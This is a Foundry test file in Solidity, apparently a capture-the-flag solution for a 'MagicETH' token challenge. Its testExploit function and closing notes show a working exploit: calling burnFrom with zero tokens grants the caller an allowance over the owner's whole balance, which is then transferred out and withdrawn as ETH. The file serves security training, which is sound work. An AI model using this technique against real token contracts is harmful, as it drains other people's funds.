// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/
        vm.startPrank(whitehat, whitehat); // act as exploiter, but send ETH to whitehat

        mETH.approve(exploiter, 1000 ether);

        mETH.burnFrom(exploiter, 0 ether);

        mETH.transferFrom(exploiter, whitehat, 1000 ether);

        mETH.withdraw(1000 ether);

        vm.stopPrank();

        assertEq(
            whitehat.balance,
            1000 ether,
            "whitehat should have 1000 ether"
        );
    }

    /*
    Notes: 
     - The burnFrom gives anyone the ability to execute an approve method ob behalf of the token owner
     - Burn 0 token gives approve 100% of the tokens to the msg.sender
    */
}
